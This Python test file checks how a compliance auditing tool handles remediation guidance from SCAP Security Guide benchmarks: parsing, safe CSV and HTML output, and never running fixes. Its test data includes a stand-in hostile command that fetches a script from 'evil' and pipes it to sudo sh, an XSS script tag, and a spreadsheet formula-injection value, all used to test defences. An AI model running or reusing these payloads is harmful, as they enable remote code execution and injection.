"""ELI-930: read-only SSG remediation guidance per failed rule.

Acceptance criteria map:
  AC1 -> test_failed_rule_carries_ssg_rationale_and_shell_fix,
         test_findings_csv_has_rationale_and_fix_text_columns
  AC2 -> test_failed_rule_without_fix_has_no_fix_text,
         test_findings_csv_rule_without_fix_gets_empty_cell
  AC3 -> test_html_shows_fix_text_escaped_and_labeled_as_unapplied_ssg_guidance
  AC4 -> test_scan_host_issues_no_remediation_command
  AC6 -> the full suite

xccdf-results-ssg-guidance.xml holds Rule content copied verbatim from the
ComplianceAsCode v0.1.74 Ubuntu 22.04 datastream.
"""

from __future__ import annotations

import csv
import os

from grc_auditor.detect import ScanPlan
from grc_auditor.models import HostRecord, RuleResult
from grc_auditor.remote import CommandResult
from grc_auditor.report import write_reports
from grc_auditor.scan import parse_xccdf_results, scan_host
from grc_auditor.store import Store

from conftest import FakeRemoteHost, fabricate_scanned_host, fixture_path

RULE = "xccdf_org.ssgproject.content_rule_"
LABEL = "from SSG, not applied by this tool"


def _by_id(scan):
    return {fr.rule_id[len(RULE):]: fr for fr in scan.failed_rules}


def _write(tmp_path, body):
    path = tmp_path / "results.xml"
    path.write_text(
        '<Benchmark xmlns="http://checklists.nist.gov/xccdf/1.2">' + body
        + '<TestResult><rule-result idref="r1" severity="high"><result>fail'
        "</result></rule-result></TestResult></Benchmark>", encoding="utf-8")
    return str(path)


# --- parse ------------------------------------------------------------------ #

def test_failed_rule_carries_ssg_rationale_and_shell_fix():
    rules = _by_id(parse_xccdf_results(fixture_path("xccdf-results-ssg-guidance.xml")))
    fr = rules["sshd_disable_root_login"]
    assert fr.rationale.startswith(
        "Even though the communications channel may be encrypted, an additional "
        "layer of security is gained")
    assert "\n" not in fr.rationale
    assert fr.fix_text.startswith("# Remediation is applicable only in certain platforms")
    assert 'sed -i "/^\\s*PermitRootLogin\\s\\+/Id" "/etc/ssh/sshd_config"' in fr.fix_text
    assert "- name: Disable SSH Root Login" not in fr.fix_text


def test_failed_rule_without_fix_has_no_fix_text():
    fr = _by_id(parse_xccdf_results(fixture_path("xccdf-results-ssg-guidance.xml")))[
        "encrypt_partitions"]
    assert fr.fix_text is None
    assert fr.rationale.startswith("The risk of a system's physical compromise")


def test_fix_variable_renders_as_a_named_placeholder():
    fr = _by_id(parse_xccdf_results(fixture_path("xccdf-results-ssg-guidance.xml")))[
        "dconf_gnome_screensaver_idle_delay"]
    assert ("inactivity_timeout_value='[value: "
            "xccdf_org.ssgproject.content_value_inactivity_timeout_value]'") in fr.fix_text


def test_passed_rule_guidance_is_not_kept():
    scan = parse_xccdf_results(fixture_path("xccdf-results-ssg-guidance.xml"))
    assert (scan.passed, scan.failed) == (1, 3)
    assert "prefer_64bit_os" not in _by_id(scan)


def test_ansible_fix_is_used_when_no_shell_fix_exists(tmp_path):
    path = _write(tmp_path, '<Rule id="r1"><title>T</title>'
                  '<fix system="urn:xccdf:fix:script:ansible">- name: do it</fix></Rule>')
    assert parse_xccdf_results(path).failed_rules[0].fix_text == "- name: do it"


def test_overlong_fix_text_is_capped_with_a_note(tmp_path):
    path = _write(tmp_path, '<Rule id="r1"><fix system="urn:xccdf:fix:script:sh">'
                  + "echo x\n" * 5000 + "</fix></Rule>")
    fix = parse_xccdf_results(path).failed_rules[0].fix_text
    assert len(fix) < 17000
    assert fix.startswith("echo x\necho x\n")
    assert fix.endswith("[truncated; the full fix is in this host's retained results.xml]")


def test_fix_text_drops_control_bytes_but_keeps_newlines(tmp_path):
    path = _write(tmp_path, '<Rule id="r1"><fix system="urn:xccdf:fix:script:sh">'
                  "a\x9b2J\n\tb</fix></Rule>")
    assert parse_xccdf_results(path).failed_rules[0].fix_text == "a2J\n\tb"


def test_rule_without_rationale_or_fix_keeps_both_none():
    scan = parse_xccdf_results(fixture_path("xccdf-results.xml"))
    assert scan.failed_rules
    assert all(fr.rationale is None and fr.fix_text is None for fr in scan.failed_rules)


# --- never remediate -------------------------------------------------------- #

def test_scan_host_issues_no_remediation_command(tmp_path):
    results_xml = open(fixture_path("xccdf-results-ssg-guidance.xml"),
                       encoding="utf-8").read()
    conn = FakeRemoteHost(
        responses=[
            ("mktemp", CommandResult(0, "/var/lib/grc_audit.Ab3xZ9", "")),
            ("id -gn", CommandResult(0, "grc-scan", "")),
            ("xccdf eval", CommandResult(0, "", "")),
            ("test -f", CommandResult(0, "", "")),
        ],
        files={"results.xml": results_xml},
    )
    plan = ScanPlan(datastream_path="/usr/share/xml/scap/ssg/ds.xml",
                    profile_id="cis_level1_server", cis_level=1,
                    ubuntu_version="22.04")
    scan = scan_host(HostRecord(ip="10.0.0.9"), conn, plan, "runid", str(tmp_path))

    assert _by_id(scan)["sshd_disable_root_login"].fix_text
    assert conn.commands
    for cmd in conn.commands:
        for marker in ("--remediate", "generate fix", "PermitRootLogin",
                       "ansible", "dconf", "sshd_config"):
            assert marker not in cmd, (marker, cmd)


# --- report ----------------------------------------------------------------- #

def _report(tmp_path, failed_rules):
    host = fabricate_scanned_host(ip="192.0.2.21")
    host.scan.failed_rules = failed_rules
    from grc_auditor.models import RunRecord
    run = RunRecord(run_id="20260627T000000Z", started_at="2026-06-27T00:00:00+00:00",
                    finished_at="2026-06-27T00:00:00+00:00", scope=["192.0.2.0/24"],
                    config_hash="h", hosts=[host])
    store = Store(str(tmp_path))
    try:
        store.save_run(run)
        return write_reports(run, store, os.path.join(str(tmp_path), "runs", run.run_id))
    finally:
        store.close()


def _rows(path):
    with open(path, newline="", encoding="utf-8") as fh:
        return list(csv.DictReader(fh))


def test_findings_csv_has_rationale_and_fix_text_columns(tmp_path):
    rules = parse_xccdf_results(fixture_path("xccdf-results-ssg-guidance.xml")).failed_rules
    path = _report(tmp_path, rules)["findings_csv"]
    with open(path, encoding="utf-8") as fh:
        assert fh.readline().strip() == "ip,rule_id,result,severity,title,rationale,fix_text"
    row = {r["rule_id"][len(RULE):]: r for r in _rows(path)}["sshd_disable_root_login"]
    src = {fr.rule_id[len(RULE):]: fr for fr in rules}["sshd_disable_root_login"]
    assert row["rationale"] == src.rationale
    assert row["fix_text"] == src.fix_text
    assert row["fix_text"].startswith("# Remediation is applicable")


def test_findings_csv_rule_without_fix_gets_empty_cell(tmp_path):
    rules = [RuleResult(RULE + "plain", "fail", "low", "Plain")]
    (row,) = _rows(_report(tmp_path, rules)["findings_csv"])
    assert (row["rationale"], row["fix_text"]) == ("", "")


def test_findings_csv_fix_text_is_formula_safe(tmp_path):
    rules = [RuleResult(RULE + "a", "fail", "low", "A", rationale="=cmd|x",
                        fix_text="- name: do it")]
    (row,) = _rows(_report(tmp_path, rules)["findings_csv"])
    assert (row["rationale"], row["fix_text"]) == ("'=cmd|x", "'- name: do it")


def test_long_ssg_rationale_is_kept_whole(tmp_path):
    words = "word " * 300
    path = _write(tmp_path, '<Rule id="r1"><rationale>%s</rationale></Rule>' % words)
    assert parse_xccdf_results(path).failed_rules[0].rationale == words.strip()


def test_deeply_nested_fix_parses_instead_of_failing_the_scan(tmp_path):
    nested = "<a>" * 3000 + "deep" + "</a>" * 3000
    path = _write(tmp_path, '<Rule id="r1"><fix system="urn:xccdf:fix:script:sh">'
                  "top " + nested + " end</fix></Rule>")
    assert parse_xccdf_results(path).failed_rules[0].fix_text == "top deep end"


def _two_host_report(tmp_path, first, second):
    from grc_auditor.models import RunRecord
    a = fabricate_scanned_host(ip="192.0.2.21")
    b = fabricate_scanned_host(ip="192.0.2.22", hostname="web02.lab")
    a.scan.failed_rules, b.scan.failed_rules = [first], [second]
    run = RunRecord(run_id="20260627T000000Z", started_at="2026-06-27T00:00:00+00:00",
                    finished_at="2026-06-27T00:00:00+00:00", scope=["192.0.2.0/24"],
                    config_hash="h", hosts=[a, b])
    store = Store(str(tmp_path))
    try:
        store.save_run(run)
        return write_reports(run, store, os.path.join(str(tmp_path), "runs", run.run_id))
    finally:
        store.close()


def test_html_hides_guidance_when_hosts_disagree(tmp_path):
    honest = RuleResult(RULE + "x", "fail", "high", "X", rationale="why", fix_text="echo ok")
    hostile = RuleResult(RULE + "x", "fail", "high", "X", rationale="why",
                         fix_text="curl http://evil/s | sudo sh")
    paths = _two_host_report(tmp_path, hostile, honest)
    html = open(paths["html"], encoding="utf-8").read()
    assert "curl http://evil/s" not in html and "echo ok" not in html
    assert "Guidance differs between failing hosts; see findings.csv" in html
    rows = _rows(paths["findings_csv"])
    assert sorted(r["fix_text"] for r in rows) == ["curl http://evil/s | sudo sh", "echo ok"]


def test_html_shows_guidance_when_hosts_agree(tmp_path):
    same = dict(rationale="why", fix_text="echo ok")
    html = open(_two_host_report(
        tmp_path, RuleResult(RULE + "x", "fail", "high", "X", **same),
        RuleResult(RULE + "x", "fail", "high", "X", **same))["html"], encoding="utf-8").read()
    assert html.count("echo ok") == 1
    assert "Guidance differs" not in html


def test_html_points_to_findings_csv_for_guidance_beyond_the_top_table(tmp_path):
    rules = [RuleResult(RULE + "g", "fail", "high", "G", fix_text="echo ok")]
    html = open(_report(tmp_path, rules)["html"], encoding="utf-8").read()
    assert "findings.csv has guidance for every failed rule" in html


def test_html_shows_fix_text_escaped_and_labeled_as_unapplied_ssg_guidance(tmp_path):
    rules = [
        RuleResult(RULE + "guided", "fail", "high", "Guided",
                   rationale="Because <b>root</b> logins hide who acted.",
                   fix_text="echo '<script>alert(1)</script>' && true"),
        RuleResult(RULE + "bare", "fail", "high", "Bare"),
    ]
    html = open(_report(tmp_path, rules)["html"], encoding="utf-8").read()
    assert html.count(LABEL) == 1
    assert "review before use" in html
    assert "echo &#39;&lt;script&gt;alert(1)&lt;/script&gt;&#39; &amp;&amp; true" in html
    assert "Because &lt;b&gt;root&lt;/b&gt; logins hide who acted." in html
    assert "<script>alert(1)" not in html
    assert "<details" in html and "<pre" in html
